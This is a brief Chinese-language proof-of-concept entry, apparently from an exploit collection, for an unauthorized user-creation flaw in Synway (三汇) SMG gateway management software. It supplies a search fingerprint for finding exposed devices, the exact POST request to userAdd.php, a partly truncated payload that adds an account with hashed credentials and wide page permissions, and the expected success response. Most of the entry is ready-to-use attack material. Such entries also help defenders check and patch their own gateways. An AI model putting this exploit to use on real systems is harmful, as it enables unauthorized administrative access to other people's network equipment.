# 三汇SMG网关管理软件8-1-1userAdd.php存在文件任意用户添加

- **系统**：三汇SMG网关管理软件　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="text ml10 mr20"`
- **请求**：`POST /en/8-1-1userAdd.php HTTP/1.1`

**请求体 / payload**
```
user_name=md5("{{name}}")
user_password=md5("1{{pass}}")
例如：随机生成name=abcde（MD5=ab56b4d92b40713acc5af89985d4b786）、pass=12345（拼接 1 后 = 112345，MD5=96e79218965eb72c92a549dd5a330112）
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 1419
user_name=ab56b4d92b40713acc5af89985d4b786&user_token=&user_password=96e79218965eb72c92a549dd5a330112&user_authorization=1&page%5B%5D=1-1sysinfo&page%5B%5D=1-4chstatus&page%5B%5D=1-3callcount&page%5B%5D=1-6sipmsgcount&page%5B%5D=1-5guideset&page%5B%5D=2-1sipset&page%5B%5D=2-3sipcompatibility&page%5B%5D=2-4natset&page%5B%5D=2-2mediaset&page%5B%5D…（脚本共 1724 字，完整版见原文）
```
- **预期**：200　|　already exists
Add user success